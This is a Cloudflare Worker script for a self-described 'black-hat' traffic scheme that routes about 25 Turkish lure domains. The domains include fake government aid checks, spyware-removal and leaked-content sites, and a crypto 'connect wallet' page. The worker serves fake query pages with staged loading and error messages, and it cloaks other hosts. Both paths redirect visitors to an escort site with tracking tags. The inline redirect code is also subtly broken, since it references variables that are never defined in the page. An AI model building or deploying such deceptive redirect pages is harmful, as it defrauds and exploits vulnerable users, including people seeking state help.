/**
 * 🕸️ DRKCNAY HYDRA: CLOUDFLARE HONEY-POT WORKER
 * Edge Router for 30+ Black-Hat Domains.
 * Intercepts traffic, renders fake themes, and executes Pop-Under/Redirects.
 */

const HONEYPOT_FLEET = [
    { domain: 'plakasorgula.shop', fleet: 'PANIC', niche: 'edevlet' },
    { domain: 'santajci-tespit.site', fleet: 'PANIC', niche: 'siber' },
    { domain: 'casus-yazilim-sil.xyz', fleet: 'PANIC', niche: 'siber' },
    { domain: 'konumbulucu.xyz', fleet: 'PANIC', niche: 'siber' },
    { domain: 'exxvideos.shop', fleet: 'HUNTER', niche: 'adult' },
    { domain: 'sansursuzturkifsa.shop', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'magazinifsa.site', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'sokhaberifsa.shop', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'dilanpolatifsa.shop', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'telegramifsaizle.shop', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'turkifsalar.shop', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'turkifsapremium.shop', fleet: 'HUNTER', niche: 'ifsa' },
    { domain: 'onlyfansizle.shop', fleet: 'HUNTER', niche: 'adult' },
    { domain: 'dizicehennemi.site', fleet: 'GREED', niche: 'dizi' },
    { domain: 'fragmanizle.shop', fleet: 'GREED', niche: 'dizi' },
    { domain: 'kesintisizizle.shop', fleet: 'GREED', niche: 'dizi' },
    { domain: 'canlimaclinki.shop', fleet: 'GREED', niche: 'mac' },
    { domain: 'fullapkoyun.shop', fleet: 'GREED', niche: 'apk' },
    { domain: 'instacoz.site', fleet: 'GREED', niche: 'smm' },
    { domain: 'tiktokhilesi.sbs', fleet: 'GREED', niche: 'smm' },
    { domain: 'bedavahesap.site', fleet: 'GREED', niche: 'premium' },
    { domain: 'kazandiranborsatuyolari.site', fleet: 'GREED', niche: 'kripto' },
    { domain: 'escortcoin.space', fleet: 'GREED', niche: 'kripto' },
    { domain: 'yardimbasvurusu.online', fleet: 'DESPERATE', niche: 'edevlet' },
    { domain: 'sanalsms.site', fleet: 'DESPERATE', niche: 'sms' }
];

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const host = url.hostname.replace('www.', '').toLowerCase();
    
    // Resolve location slug (e.g. /sisli -> sisli, or / -> istanbul)
    const loc = url.pathname === '/' ? 'istanbul' : url.pathname.replace(/^\/+/, '').split('/')[0];

    // ⚡ DRKCNAY BYPASS: exxvideos.shop is an autonomous portal, NOT a trap.
    // It must reach the origin server (Next.js) directly.
    if (host.includes('exxvideos.shop')) {
      return fetch(request);
    }

    // 1. Determine Fleet and Niche Based on Hostname
    const config = HONEYPOT_FLEET.find(d => host.includes(d.domain));
    const fleet = config ? config.fleet : 'GHOST';
    const niche = config ? config.niche : 'cloak';

    // 2. DRKCNAY Cloak (Twitter Redirect Logic)
    // If this is a link shortener domain, instantly redirect to the VIP site with utm tags
    if (niche === 'cloak') {
      const targetPath = loc === 'istanbul' ? 'istanbul' : `istanbul/${loc}`;
      const targetUrl = `https://vipescorthizmeti.com/${targetPath}?utm_source=x_army&utm_medium=cloak&utm_campaign=${host}`;
      return Response.redirect(targetUrl, 301);
    }

    // 3. Honey-Pot HTML Templates
    // In a full production setup, this worker would fetch pre-generated HTML from our KV or DB.
    // For this edge script, we inject the trap mechanism.
    
    let pageTitle = "Sorgulama Ekranı";
    let buttonText = "Sonuçları Gör";
    let fakeLoadingText = "Veritabanı taranıyor...";
    
    if (niche === 'edevlet') {
        pageTitle = "E-Devlet Yardım Sorgulama";
        buttonText = "Başvuruyu Sorgula";
    } else if (niche === 'sms') {
        pageTitle = "Sanal Numara Onayı";
        buttonText = "SMS Kodu Al";
    } else if (niche === 'kripto') {
        pageTitle = "Coin Airdrop Claim";
        buttonText = "Cüzdanı Bağla";
    }

    const html = `
      <!DOCTYPE html>
      <html lang="tr">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>${pageTitle}</title>
          <style>
              body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f3f4f6; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #111827; }
              .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
              h1 { font-size: 1.5rem; margin-bottom: 1.5rem; color: #1f2937; }
              .btn { background: #2563eb; color: white; border: none; padding: 12px 24px; font-size: 1rem; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: background 0.3s; }
              .btn:hover { background: #1d4ed8; }
              .loading { display: none; margin-top: 1rem; color: #4b5563; font-size: 0.9rem; }
              .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px auto; }
              @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
              .hidden-trap { opacity: 0.01; position: absolute; z-index: -1; pointer-events: none; }
          </style>
      </head>
      <body>
          <div class="card">
              <h1>${pageTitle}</h1>
              <p style="margin-bottom: 1.5rem; color: #6b7280; font-size: 0.95rem;">Sisteme erişmek için devam edin.</p>
              
              <button class="btn" id="actionBtn" onclick="startTrap()">${buttonText}</button>
              
              <div class="loading" id="loadingBar">
                   <div class="spinner"></div>
                  ${fakeLoadingText}
              </div>
              
              <div id="resultBox" style="display: none; margin-top: 1rem; color: #e11d48; font-weight: bold;">
                  Bağlantı Hatası! Sunucuya ulaşılamıyor.
              </div>
          </div>

          <script>
              // ☠️ DRKCNAY POP-UNDER TRAP
              function startTrap() {
                  document.getElementById('actionBtn').style.display = 'none';
                  document.getElementById('loadingBar').style.display = 'block';
                  
                  setTimeout(() => {
                      document.getElementById('loadingBar').style.display = 'none';
                      document.getElementById('resultBox').style.display = 'block';
                      
                      // Pop-Under Logic: Open VIP Escort site in a new invisible tab or redirect the current tab
                      const targetPath = \`\${loc}\` === 'istanbul' ? 'istanbul' : \`istanbul/\${loc}\`;
                      const vipUrl = \`https://vipescorthizmeti.com/\${targetPath}?utm_source=honey_pot&utm_medium=popunder&utm_campaign=\${niche}\`;
                      
                      // We redirect the current window to the VIP site (highest conversion)
                      // In a real stealth pop-under, we'd open a new window and focus back on the old one.
                      window.location.href = vipUrl;
                      
                  }, 2500);
              }
          </script>
      </body>
      </html>
    `;

    return new Response(html, {
      headers: { 'Content-Type': 'text/html;charset=UTF-8' },
    });
  },
};
